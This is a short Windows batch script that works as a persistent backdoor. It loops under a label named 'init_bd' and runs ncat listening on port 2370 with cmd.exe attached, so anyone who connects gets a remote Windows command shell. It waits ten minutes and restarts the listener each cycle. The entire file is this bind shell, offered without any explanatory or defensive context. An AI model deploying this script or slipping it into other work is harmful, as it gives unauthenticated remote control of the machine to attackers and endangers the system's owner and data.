:init_bd:
ncat -l -p 2370 -e cmd.exe
timeout /nobreak 600 
goto :init_bd:
